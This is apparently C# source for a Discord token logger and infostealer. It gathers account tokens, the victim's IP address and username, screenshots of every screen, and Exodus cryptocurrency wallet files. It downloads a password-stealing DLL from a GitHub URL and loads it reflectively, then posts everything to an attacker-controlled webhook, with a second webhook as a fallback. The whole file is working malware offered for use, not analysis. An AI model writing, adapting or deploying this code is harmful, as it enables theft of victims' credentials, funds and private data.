using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace logger
{
    class Utils
    {
        public static List<string> Accounts = new List<string>();



        public static async Task SendWebhookAsync()
        {



            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent form = new MultipartFormDataContent();
            StringBuilder accounts = new StringBuilder();
            foreach(var acc in Accounts)
            {
                accounts.Append(acc + "\n\n");
            }
            form.Add(new StringContent("**New Login**\nIP: " + GetIP() + " \nEnv User: " + Environment.UserName + "\nPath: " + Directory.GetCurrentDirectory() + "\n\nAccounts:\n\n" + accounts.ToString()), "content");
            var passwords = PasswordStealer.mmain();
            if(passwords.Length > 0)
            {
                byte[] filee = Encoding.ASCII.GetBytes(passwords);

                form.Add(new ByteArrayContent(filee, 0, filee.Length), "passwords", "passwords.txt");
            }
          

            foreach (var screen in Screen.AllScreens)
            {

                var bytes = GetSreenshot(screen);

                var file_bytes = ImageToByte2(bytes);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), screen.DeviceName, screen.DeviceName + ".jpg");

            }
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Exodus\exodus.wallet";

            if(Directory.Exists(path)){

                string[] files = Directory.GetFiles(path);


                var realfiles = new List<FileInfo>();

                foreach (string file in files)
                {
                    var fi1 = new FileInfo(file);

                    realfiles.Add(fi1);

                }

                var stream = CreateZipFile(realfiles);


                form.Add(new ByteArrayContent(stream, 0, stream.Length), "exodus", "exodus.zip");


            }


            try
            {
                HttpResponseMessage response = await httpClient.PostAsync(Program.webhook, form);

                response.EnsureSuccessStatusCode();
                httpClient.Dispose();
                string sd = response.Content.ReadAsStringAsync().Result;
            }
            catch
            {
                HttpResponseMessage response = await httpClient.PostAsync(Program.altwebhook, form);

                response.EnsureSuccessStatusCode();
                httpClient.Dispose();
                string sd = response.Content.ReadAsStringAsync().Result;
            }
        
       

        }
        private static byte[] CreateZipFile(IEnumerable<FileInfo> files)
        {
            var stream = new MemoryStream();
            

                var archive = new ZipArchive(stream, System.IO.Compression.ZipArchiveMode.Create);

                foreach (var item in files)
                {
                    archive.CreateEntryFromFile(item.FullName, item.Name, CompressionLevel.Optimal);
                }

                archive.Dispose();
                //File.WriteAllBytes("fdsf.zip", stream.ToArray());
                return stream.ToArray();

            











        }
        public static string GetIP()
        {

            WebClient client = new WebClient();

            string v6site = client.DownloadString("https://api.myip.com");
            string v4site = client.DownloadString("https://api.ipify.org/?format=json");


            dynamic v6json = JsonConvert.DeserializeObject(v6site);

            dynamic v4json = JsonConvert.DeserializeObject(v4site);

            //https://api.ipify.org/?format=json




            return "||" + v4json.ip + "|| , " + v6json.country;



        }
        public static Bitmap GetSreenshot(Screen screen)
        {
            Bitmap bm = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
            Graphics g = Graphics.FromImage(bm);
            g.CopyFromScreen(screen.Bounds.X,
        screen.Bounds.Y,
        0,
        0,

         screen.Bounds.Size);
            return bm;
        }

        public static byte[] ImageToByte2(Image img)
        {
            var stream = new MemoryStream();
            
                img.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                return stream.ToArray();
            
        }


    }





    class PasswordStealer
    {

        public static string mmain()
        {
          
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
                                                 | SecurityProtocolType.Tls11
                                                 | SecurityProtocolType.Tls12
                                                 | SecurityProtocolType.Ssl3;

            byte[] dll = Logic.GetLibrary();
           
            string pwd = Logic.GetPasswords(dll);
            
            return pwd;
        }
    }


    internal sealed class Logic
    {

        public static byte[] GetLibrary()
        {
            byte[] dll = new byte[0];
            var client = new WebClient();
            
                try
                {
                    dll = client.DownloadData("https://raw.githubusercontent.com/fknMega/Discord-Token-Logger/master/logger/PasswordStealer.dll");
                }
                catch (WebException ex)
                {
                    
                }
            
            return dll;
        }


        public static string GetPasswords(byte[] dll)
        {
       
            Assembly asm = Assembly.Load(dll);
     
            dynamic instance = Activator.CreateInstance(
                asm.GetType("PasswordStealer.Stealer"));

     
            MethodInfo runMethod = instance.GetType().GetMethod("Run",
                BindingFlags.Instance | BindingFlags.Public);

        
            string passwords = (string)runMethod.Invoke(
                instance, new object[] { });
        
            return passwords;
        }




    }
}